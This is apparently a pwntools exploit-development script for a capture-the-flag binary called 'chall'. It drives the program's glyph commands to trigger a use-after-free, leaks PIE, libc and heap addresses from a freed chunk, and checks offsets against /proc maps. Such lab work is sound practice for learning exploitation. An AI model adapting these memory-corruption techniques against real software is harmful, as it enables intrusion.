from pwn import *
context.binary = './chall'
context.log_level = 'error'
import os
os.environ['LD_LIBRARY_PATH'] = '.'
p = process(['./ld-linux-x86-64.so.2','--library-path','.','./chall'])
def cmd(c):
    p.recvuntil(b'glyph> '); p.sendline(c)
cmd(b'load /bin/sh')
cmd(b'style a')
cmd(b'layout')
cmd(b'paint')
cmd(b'inspect paint raw')     # before UAF - gives PIE leak (kSafeFilter)
p.recvuntil(b'raw='); raw=p.recvline().strip()
b0=bytes.fromhex(raw.decode())
pie_leak = u64(b0[0x10:0x18])
print(f"PIE leak (kSafeFilter) = {pie_leak:#x}")
cmd(b'style b')
cmd(b'optimize')
cmd(b'inspect paint raw')     # after UAF - freed chunk
p.recvuntil(b'raw='); raw=p.recvline().strip()
b1=bytes.fromhex(raw.decode())
for off in range(0,0x50,8):
    print(f"  off {off:#x}: {u64(b1[off:off+8]):#x}")
libc_leak = u64(b1[0x00:0x08])
heap_leak = u64(b1[0x08:0x10])
print(f"libc leak (fd) = {libc_leak:#x}")
print(f"heap leak (bk) = {heap_leak:#x}")
# /proc maps to find libc base
maps=open(f'/proc/{p.pid}/maps').read()
for l in maps.splitlines():
    if 'libc' in l and 'r-xp' in l:
        print("libc rx:", l)
        libc_base = int(l.split('-')[0],16)
        print(f"libc_base = {libc_base:#x}")
        print(f"libc_leak - libc_base = {libc_leak - libc_base:#x}")
        break
for l in maps.splitlines():
    if '[heap]' in l:
        print("heap:", l)
        break
p.close()
